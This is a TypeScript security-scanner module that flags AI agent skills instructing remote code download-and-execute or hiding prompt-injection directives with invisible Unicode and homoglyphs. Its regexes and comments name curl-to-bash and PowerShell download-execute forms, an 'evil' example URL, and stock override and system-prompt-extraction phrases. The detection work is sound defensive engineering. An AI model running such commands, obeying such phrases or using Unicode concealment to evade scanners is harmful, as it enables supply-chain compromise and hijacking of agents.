/**
 * SMI-5359 Wave 4.2c: Edge code_execution + obfuscated_directive detectors
 * @module scripts/indexer/_shared/security-scanner-edge.exec (Node port)
 *
 * Byte-identical body to its supabase/functions/_shared twin (parity test
 * enforces). Pure Deno/Web APIs, no Node deps. Port of @skillsmith/core
 * SecurityScanner.exec.ts so the prod edge quarantine gate detects the same two
 * top-tier attack classes the core scanner now does (merged core 4.2, ac56767f):
 *
 *  • code_execution     — a skill instructing a remote fetch piped into an
 *    interpreter (curl|bash and friends). ONE medium finding on its own (score
 *    12, sub-threshold); escalated to critical (score 40, quarantines) only when
 *    it co-occurs with a NON-documentation exfil / privilege / obfuscation signal.
 *  • obfuscated_directive — a verb+object directive concealed with zero-width /
 *    bidi / tag-block / combining chars or homoglyphs (Cyrillic, Greek,
 *    fullwidth-Latin, Mathematical-Alphanumeric) and revealed only after
 *    de-obfuscation. Delta-gated + verb+object-anchored. ONE critical finding
 *    (score 40, quarantines alone). A blanket NFKC pass is intentionally NOT used
 *    (it folds fullwidth CJK to ASCII and false-positives); fullwidth Latin is
 *    mapped by offset, NFKC is applied per-char ONLY to the math-alphanumeric
 *    range (no CJK). Unlike code_execution, this has NO doc-context downgrade — a
 *    live concealed payload is an attack even inside a fence.
 */

import type {
  SecurityFinding,
  SecurityFindingType,
  LineContext,
} from './security-scanner-edge.context.ts'
import { isDocumentationContext } from './security-scanner-edge.context.ts'

// ReDoS protection: maximum line length for regex matching (mirrors scanner).
const MAX_LINE_LENGTH = 10000

function safeRegexTest(pattern: RegExp, input: string): RegExpMatchArray | null {
  const safeInput = input.length > MAX_LINE_LENGTH ? input.slice(0, MAX_LINE_LENGTH) : input
  return safeInput.match(pattern)
}

// ============================================================================
// code_execution: remote-fetch-to-interpreter patterns
// ============================================================================

/**
 * Every pattern requires BOTH a fetch verb (curl/wget/irm/iwr/Invoke-WebRequest/
 * Net.WebClient) AND an execution sink (| sh|python|node…, <(...), eval $(...),
 * iex, -EncodedCommand). A bare package install (npm/pip/brew/cargo/apt) matches
 * none. Bounded quantifiers exclude the pipe / newline — no catastrophic backtracking.
 *
 * SMI-5359 Wave 4.2c retune (read-only prod sim FP): the curl/wget patterns also
 * require a CONCRETE remote target (http(s):// or a host.tld domain), so a
 * code-review/security-review skill documenting the generic pattern in prose
 * ("curl … | sh", placeholder, no target) no longer matches, while a real
 * "curl https://evil/x | bash" still does.
 */
export const CODE_EXECUTION_PATTERNS: RegExp[] = [
  // curl|wget <target> | [sudo] <interpreter>
  /(?:curl|wget)\b[^\n|]{0,150}?(?:https?:\/\/|\d{1,3}(?:\.\d{1,3}){3}|[\w-]{2,63}\.[a-z]{2,24})[^\n|]{0,150}?\|\s*(?:sudo\s+(?:-[A-Za-z]+\s+)?)?(?:(?:ba|z|da)?sh|python[23]?|node|ruby|perl|php|fish|bun|deno)\b/i,
  // process substitution: bash/sh/zsh/source/. <(curl|wget <target> ...)
  /(?:^|[\s;&])(?:source|\.|ba?sh|zsh|exec)\s+<\(\s*(?:curl|wget)\b[^\n)]{0,150}?(?:https?:\/\/|\d{1,3}(?:\.\d{1,3}){3}|[\w-]{2,63}\.[a-z]{2,24})/i,
  // command substitution into eval or `sh -c` with a remote target
  /(?:\beval\b|(?:ba|z)?sh\s+-c)\s+["']?[$`]\(?\s*(?:curl|wget)\b[^\n)]{0,150}?(?:https?:\/\/|\d{1,3}(?:\.\d{1,3}){3}|[\w-]{2,63}\.[a-z]{2,24})/i,
  // PowerShell download-and-execute
  /\b(?:iex|invoke-expression)\b[^\n]{0,100}?(?:\birm\b|\biwr\b|invoke-webrequest|invoke-restmethod|downloadstring|net\.webclient)/i,
  // PowerShell encoded command
  /\bpowershell\b[^\n]{0,60}?\s-e(?:nc|ncodedcommand)?\b\s*[A-Za-z0-9+/=]{16,}/i,
  // decode-then-exec: base64 -d ... | <interpreter>  (SMI-5359 retro NIT: da sink + interpreters)
  /\bbase64\s+(?:-d|--decode|-D)\b[^\n|]{0,60}?\|\s*(?:(?:ba|z|da)?sh|python[23]?|node|ruby|perl|php|fish|bun|deno)\b/i,
  // SMI-5424 FN-1: chained / redirect download-then-execute (curl URL -o /tmp/x && bash /tmp/x)
  /(?:curl|wget)\b[^\n]{0,150}?(?:https?:\/\/|\d{1,3}(?:\.\d{1,3}){3}|[\w-]{2,63}\.[a-z]{2,24})[^\n]{0,150}?(?:&&|;)\s*(?:sudo\s+(?:-[A-Za-z]+\s+)?)?(?:(?:ba|z|da)?sh|python[23]?|node|ruby|perl|php|fish|bun|deno)\b/i,
  // SMI-5424 FN-2: npx executing a REMOTE source (URL or github:), never a local package (npx tsc is clean)
  /\bnpx\s+(?:--yes\s+|-y\s+)?(?:https?:\/\/\S+|github:\S+)/i,
  // SMI-5424 FN-4: node/python/deno/bun inline-eval (-e/-c) with a dangerous payload
  /\b(?:node|python[23]?|deno|bun)\s+(?:-e|-c|--eval|--exec)\s+['"][^'"]{0,200}?(?:require\(|child_process|fetch\(|\bexec\b|eval\(|base64|urllib|os\.system|subprocess)/i,
]

/**
 * code_execution: single-emission — at most one MEDIUM finding per skill (first
 * match). escalateCodeExecution() promotes it to CRITICAL on co-occurrence.
 */
export function scanCodeExecution(lines: string[], contexts: LineContext[]): SecurityFinding[] {
  for (const [index, line] of lines.entries()) {
    for (const pattern of CODE_EXECUTION_PATTERNS) {
      const match = safeRegexTest(pattern, line)
      if (match) {
        const ctx = contexts[index]
        const inDocContext = ctx ? isDocumentationContext(ctx) : false
        return [
          {
            type: 'code_execution',
            severity: 'medium',
            message: `Remote fetch piped to an interpreter: "${match[0].slice(0, 60)}"`,
            lineNumber: index + 1,
            location: line.trim().slice(0, 100),
            inDocumentationContext: inDocContext,
            confidence: 'high',
          },
        ]
      }
    }
  }
  return []
}

// ============================================================================
// obfuscated_directive: Unicode-concealment de-obfuscation
// ============================================================================

const INVISIBLE_RANGE =
  '\\u0300-\\u036F\\u00AD\\u061C\\u180E\\u200B-\\u200F\\u202A-\\u202E\\u2060-\\u2064\\u2066-\\u206F\\uFEFF'
const INVISIBLE_TEST = new RegExp('[' + INVISIBLE_RANGE + ']|[\\u{E0000}-\\u{E007F}]', 'u')
const INVISIBLE_STRIP = new RegExp('[' + INVISIBLE_RANGE + ']|[\\u{E0000}-\\u{E007F}]', 'gu')

/** Conservative UTS-#39 homoglyph subset: unambiguous Cyrillic/Greek look-alikes. */
const CONFUSABLES: Record<string, string> = {
  а: 'a',
  е: 'e',
  о: 'o',
  р: 'p',
  с: 'c',
  у: 'y',
  х: 'x',
  і: 'i',
  ј: 'j',
  ѕ: 's',
  ԁ: 'd',
  һ: 'h',
  к: 'k',
  м: 'm',
  т: 't',
  в: 'b',
  н: 'h',
  ο: 'o',
  α: 'a',
  ρ: 'p',
  ε: 'e',
  τ: 't',
  ι: 'i',
  κ: 'k',
  υ: 'u',
  χ: 'x',
  ν: 'v',
  ϲ: 'c',
  β: 'b',
}

function isFullwidthLatin(cp: number): boolean {
  return (cp >= 0xff21 && cp <= 0xff3a) || (cp >= 0xff41 && cp <= 0xff5a)
}

function isMathAlphanumeric(cp: number): boolean {
  return cp >= 0x1d400 && cp <= 0x1d7ff
}

function stripInvisible(s: string): string {
  return s.replace(INVISIBLE_STRIP, '')
}

/** Map homoglyphs + fullwidth Latin + math-alphanumeric to their ASCII skeleton. */
function confusableSkeleton(s: string): string {
  let out = ''
  for (const ch of s) {
    const cp = ch.codePointAt(0) ?? 0
    if (isFullwidthLatin(cp)) {
      out += String.fromCodePoint(cp - 0xfee0)
    } else if (isMathAlphanumeric(cp)) {
      // NFKC folds a math-styled glyph to its base; chain through CONFUSABLES so a
      // math-styled Greek/Cyrillic homoglyph (folds to Greek/Cyrillic) still maps
      // to Latin (SMI-5359 retro NIT). Safe: the range contains no CJK.
      const folded = ch.normalize('NFKC')
      out += CONFUSABLES[folded] ?? folded
    } else if (CONFUSABLES[ch]) {
      out += CONFUSABLES[ch]
    } else {
      out += ch
    }
  }
  return out
}

function hasConfusable(s: string): boolean {
  for (const ch of s) {
    const cp = ch.codePointAt(0) ?? 0
    if (isFullwidthLatin(cp) || isMathAlphanumeric(cp) || CONFUSABLES[ch]) return true
  }
  return false
}

/**
 * Verb+object directive payloads worth concealing. STRICTLY verb+object — never a
 * bare keyword/noun-phrase — so a benign de-obfuscated word (or "developer mode"
 * in fullwidth/math glyphs) cannot trip it. Bounded (ReDoS-safe), non-global.
 */
const OBFUSCATION_DIRECTIVE_PATTERN =
  /(?:ignore|disregard|forget)\s+(?:all\s+|the\s+)?(?:previous|prior|above|earlier)\s+(?:instruction|prompt|rule|direction)|bypass\s+(?:all\s+)?(?:restriction|filter|safety|guard|security)|(?:reveal|show|print|dump|leak)\s+(?:me\s+)?(?:your\s+|the\s+)?(?:system\s+)?(?:prompt|instruction)|(?:curl|wget)\b[^\n|]{0,120}?(?:https?:\/\/|\d{1,3}(?:\.\d{1,3}){3}|[\w-]{2,63}\.[a-z]{2,24})[^\n|]{0,120}?\|\s*(?:ba|z)?sh\b/i

/**
 * obfuscated_directive: single-emission CRITICAL. Delta-gated — a directive
 * already plainly visible in the raw line is left to the jailbreak detector.
 */
export function scanObfuscatedDirective(lines: string[]): SecurityFinding[] {
  for (const [index, raw] of lines.entries()) {
    const hasInvisible = INVISIBLE_TEST.test(raw)
    const hasConf = hasConfusable(raw)
    if (!hasInvisible && !hasConf) continue
    // Already visible => not concealed; another detector owns it.
    if (safeRegexTest(OBFUSCATION_DIRECTIVE_PATTERN, raw)) continue

    const transforms: string[] = []
    if (hasInvisible) transforms.push(stripInvisible(raw))
    if (hasConf) transforms.push(confusableSkeleton(raw))
    if (hasInvisible && hasConf) transforms.push(confusableSkeleton(stripInvisible(raw)))

    for (const transformed of transforms) {
      if (transformed === raw) continue
      const match = safeRegexTest(OBFUSCATION_DIRECTIVE_PATTERN, transformed)
      if (match) {
        return [
          {
            type: 'obfuscated_directive',
            severity: 'critical',
            message: `Security directive concealed via Unicode obfuscation, revealed after de-obfuscation: "${match[0].slice(0, 60)}"`,
            lineNumber: index + 1,
            location: raw.trim().slice(0, 100),
            inDocumentationContext: false,
            confidence: 'high',
          },
        ]
      }
    }
  }
  return []
}

// ============================================================================
// Co-occurrence escalation
// ============================================================================

const CODE_EXECUTION_CO_OCCURRENCE: ReadonlySet<SecurityFindingType> = new Set<SecurityFindingType>(
  ['data_exfiltration', 'privilege_escalation', 'obfuscated_directive']
)

/**
 * Escalate the code_execution finding to CRITICAL when a NON-documentation
 * high/critical exfil / privilege / obfuscation signal is also present. Mutates
 * in place. The non-doc gate keeps legitimate security-research skills (examples
 * in fenced blocks) at MEDIUM.
 */
export function escalateCodeExecution(findings: SecurityFinding[]): void {
  const codeExec = findings.find((f) => f.type === 'code_execution')
  if (!codeExec) return

  const hasDangerousCoSignal = findings.some(
    (f) =>
      f !== codeExec &&
      CODE_EXECUTION_CO_OCCURRENCE.has(f.type) &&
      f.inDocumentationContext !== true &&
      (f.severity === 'high' || f.severity === 'critical')
  )

  if (hasDangerousCoSignal) {
    codeExec.severity = 'critical'
    codeExec.message = `Remote fetch piped to an interpreter, co-occurring with exfiltration/privilege/obfuscation signals — likely supply-chain execution. ${codeExec.message}`
  }
}
